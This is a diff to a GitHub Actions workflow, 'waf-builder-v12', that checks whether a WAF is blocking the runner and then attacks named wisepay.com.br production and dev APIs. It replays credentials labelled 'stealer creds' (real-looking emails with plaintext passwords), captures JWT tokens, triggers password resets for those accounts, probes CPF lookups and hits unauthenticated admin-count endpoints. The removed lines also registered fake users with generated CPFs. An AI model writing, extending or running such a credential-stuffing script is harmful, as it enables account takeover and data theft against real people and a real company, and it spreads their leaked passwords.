@@ -1,4 +1,4 @@
-name: waf-builder-v11
+name: waf-builder-v12
 on:
   workflow_dispatch:
 jobs:
@@ -15,96 +15,120 @@ jobs:
         set +e
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
+        DEV_BASE="https://wpdataservice-dev.wisepay.com.br"
         BUILDER_BASE="https://wpbuilderservices-dev.wisepay.com.br"
         VALE_ORIGIN="https://vale.wisepay.com.br"
         BUILDER_ORIGIN="https://builder-dev.wisepay.com.br"
 
         MY_IP=$(curl -s -m 5 https://api.ipify.org 2>/dev/null || echo "unknown")
 
-        # WAF check via wpdataservice
-        RESP_CHECK=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+        # WAF check primario: wpdataservice prod (us-east-1)
+        RESP_PROD=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
           -H "Content-Type: application/json" -H "type-application: web" \
           -X POST "$BASE/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' 2>/dev/null) || true
+        WAF_PROD=0
+        echo "$RESP_PROD" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null && WAF_PROD=1
 
-        if ! echo "$RESP_CHECK" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
-          echo "[${{ matrix.attempt }}] WAF blocking (IP: $MY_IP). Skip."
+        # WAF check secundario: wpdataservice-dev (us-east-2 only)
+        RESP_DEV=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
+          -H "type-application: web" \
+          "$DEV_BASE/users/theme" 2>/dev/null) || true
+        WAF_DEV=0
+        echo "$RESP_DEV" | python3 -c "import sys,json; d=json.load(sys.stdin); assert 'whitelabel_id' in str(d) or 'id' in str(d)" 2>/dev/null && WAF_DEV=1
+
+        echo "[${{ matrix.attempt }}] IP=$MY_IP | WAF_PROD=$WAF_PROD | WAF_DEV=$WAF_DEV"
+
+        if [ "$WAF_PROD" = "0" ] && [ "$WAF_DEV" = "0" ]; then
+          echo "Both WAFs blocking. Skip."
           exit 0
         fi
 
-        echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
+        if [ "$WAF_PROD" = "1" ]; then
+          echo "=== PROD WAF BYPASSED ==="
 
-        echo "=== P1: Builder login com stealer creds ==="
-        for CRED in \
-          "gideanbispo@gmail.com|135@mudar" \
-          "niveareis@gmail.com|937495jeF" \
-          "criatek.ti@gmail.com|Laurab2308" \
-          "lenildo.silva@outlook.com|Rede\$1234" \
-          "lenildo.silva@outlook.com|Rede@4321"; do
-          EMAIL="${CRED%%|*}"
-          PASS="${CRED##*|}"
-          RB=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-            -H "Content-Type: application/json" \
+          echo "--- P1: gideanbispo+niveareis com empresa nova ==="
+          for CRED in \
+            "gideanbispo@gmail.com|135@mudar" \
+            "niveareis@gmail.com|937495jeF"; do
+            EMAIL="${CRED%%|*}"
+            PASS="${CRED##*|}"
+            RP=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+              -H "Content-Type: application/json" -H "type-application: web" \
+              -H "Origin: $VALE_ORIGIN" \
+              -X POST "$BASE/login" \
+              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RP=""
+            CODE=$(echo "$RP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
+            MSG=$(echo "$RP" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e)[:120])" 2>/dev/null || echo "${RP:0:120}")
+            if [ "$CODE" = "200" ]; then
+              TOKEN=$(echo "$RP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null || echo "")
+              echo "*** JWT SUCCESS *** $EMAIL token=${TOKEN:0:50}"
+            else
+              echo "LOGIN $CODE | $EMAIL | $MSG"
+            fi
+            sleep 0.3
+          done
+
+          echo "--- P2: Password recover + verify token format ==="
+          for EMAIL in "gideanbispo@gmail.com" "niveareis@gmail.com" "lenildo.silva@outlook.com"; do
+            RR=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
+              -H "Content-Type: application/json" -H "type-application: web" \
+              -X POST "$BASE/login/password-recover" \
+              -d "{\"email\":\"$EMAIL\"}" 2>/dev/null) || RR=""
+            CODE_R=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',204))" 2>/dev/null || echo "204")
+            echo "RECOVER $CODE_R | $EMAIL | ${RR:0:80}"
+            sleep 0.2
+          done
+
+          echo "--- P3: users/consult por CPF known users ==="
+          for CPF in "00000000000" "11111111111" "12345678901"; do
+            RC=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
+              -H "type-application: web" \
+              "$BASE/users/$CPF/consult" 2>/dev/null) || RC=""
+            echo "CPF_CONSULT $CPF: $(echo $RC | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:150])' 2>/dev/null || echo "${RC:0:100}")"
+            sleep 0.2
+          done
+        fi
+
+        if [ "$WAF_DEV" = "1" ]; then
+          echo "=== DEV WAF BYPASSED (us-east-2) ==="
+
+          echo "--- P4: Builder login com stealer creds ==="
+          for CRED in \
+            "gideanbispo@gmail.com|135@mudar" \
+            "niveareis@gmail.com|937495jeF" \
+            "criatek.ti@gmail.com|Laurab2308" \
+            "lenildo.silva@outlook.com|Rede@4321"; do
+            EMAIL="${CRED%%|*}"
+            PASS="${CRED##*|}"
+            RB=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+              -H "Content-Type: application/json" \
+              -H "Origin: $BUILDER_ORIGIN" \
+              -X POST "$BUILDER_BASE/login" \
+              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RB=""
+            CODE=$(echo "$RB" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
+            if [ "$CODE" = "200" ]; then
+              TOKEN=$(echo "$RB" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null || echo "")
+              echo "*** BUILDER JWT SUCCESS *** $EMAIL token=${TOKEN:0:50}"
+            else
+              MSG=$(echo "$RB" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e)[:100])" 2>/dev/null || echo "${RB:0:100}")
+              echo "BUILDER $CODE | $EMAIL | $MSG"
+            fi
+            sleep 0.3
+          done
+
+          echo "--- P5: Builder whitelabels sem auth ==="
+          RW=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
             -H "Origin: $BUILDER_ORIGIN" \
-            -X POST "$BUILDER_BASE/login" \
-            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RB=""
-          CODE=$(echo "$RB" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
-          if [ "$CODE" = "200" ]; then
-            TOKEN=$(echo "$RB" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null || echo "")
-            echo "*** BUILDER JWT SUCCESS *** $EMAIL | token=${TOKEN:0:40}..."
-          else
-            MSG=$(echo "$RB" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e)[:80])" 2>/dev/null || echo "${RB:0:80}")
-            echo "BUILDER LOGIN $CODE | $EMAIL | $MSG"
-          fi
-          sleep 0.2
-        done
+            "$BUILDER_BASE/whitelabels" 2>/dev/null) || RW=""
+          echo "WHITELABELS: $(echo $RW | python3 -c 'import sys,json; d=json.load(sys.stdin); print(str(d)[:500])' 2>/dev/null || echo "${RW:0:300}")"
 
-        echo ""
-        echo "=== P2: wpdataservice login (stealer creds como portal) ==="
-        for CRED in \
-          "gideanbispo@gmail.com|135@mudar" \
-          "niveareis@gmail.com|937495jeF" \
-          "criatek.ti@gmail.com|Laurab2308"; do
-          EMAIL="${CRED%%|*}"
-          PASS="${CRED##*|}"
-          RP=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-            -H "Content-Type: application/json" -H "type-application: web" \
-            -X POST "$BASE/login" \
-            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RP=""
-          CODE=$(echo "$RP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
-          if [ "$CODE" = "200" ]; then
-            TOKEN=$(echo "$RP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null || echo "")
-            echo "*** PORTAL JWT SUCCESS *** $EMAIL | token=${TOKEN:0:40}..."
-          else
-            MSG=$(echo "$RP" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e)[:80])" 2>/dev/null || echo "${RP:0:80}")
-            echo "PORTAL LOGIN $CODE | $EMAIL | $MSG"
-          fi
-          sleep 0.2
-        done
-
-        echo ""
-        echo "=== P3: Builder whitelabels sem auth ==="
-        RW=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-          -H "Origin: $BUILDER_ORIGIN" \
-          "$BUILDER_BASE/whitelabels" 2>/dev/null) || RW=""
-        echo "WHITELABELS: $(echo $RW | python3 -c 'import sys,json; d=json.load(sys.stdin); print(str(d)[:300])' 2>/dev/null || echo "${RW:0:200}")"
-
-        echo ""
-        echo "=== P4: wpdataservice POST /users (registro público) ==="
-        # CPF gerado
-        CPF=$(python3 -c "import random;d=[random.randint(0,9) for _ in range(9)];[d.append(0 if sum(a*b for a,b in zip(d,w))%11<2 else 11-sum(a*b for a,b in zip(d,w))%11) for w in [[10,9,8,7,6,5,4,3,2],[11,10,9,8,7,6,5,4,3,2]]];print(''.join(map(str,d)))" 2>/dev/null || echo "98765432100")
-        RU=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-          -H "Content-Type: application/json" -H "type-application: web" \
-          -H "Origin: $VALE_ORIGIN" \
-          -X POST "$BASE/users" \
-          -d "{\"name\":\"Rafael Oliveira\",\"email\":\"rafael.oliveira55@gmail.com\",\"password\":\"Rafael@2024!\",\"cpf\":\"$CPF\",\"phone\":\"11912345678\",\"whitelabel_id\":154}" \
-          2>/dev/null) || RU=""
-        echo "POST_USERS: $(echo $RU | python3 -c 'import sys,json; d=json.load(sys.stdin); print(str(d)[:400])' 2>/dev/null || echo "${RU:0:300}")"
-
-        echo ""
-        echo "=== P5: Builder login sem content-type (tenta bypass) ==="
-        RX=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-          -H "Origin: $BUILDER_ORIGIN" \
-          -X POST "$BUILDER_BASE/login" \
-          --data-raw '{"email":"gideanbispo@gmail.com","password":"135@mudar"}' 2>/dev/null) || RX=""
-        echo "BUILDER_NOCT: $(echo $RX | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:200])' 2>/dev/null || echo "${RX:0:200}")"
+          echo "--- P6: Builder count endpoints sem auth ==="
+          for EP in "/whitelabels/count/all_companies" "/whitelabels/count/pending_payments" "/whitelabels/novo"; do
+            RC=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
+              -H "Origin: $BUILDER_ORIGIN" \
+              "$BUILDER_BASE$EP" 2>/dev/null) || RC=""
+            echo "$EP: $(echo $RC | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:200])' 2>/dev/null || echo "${RC:0:150}")"
+            sleep 0.2
+          done
+        fi
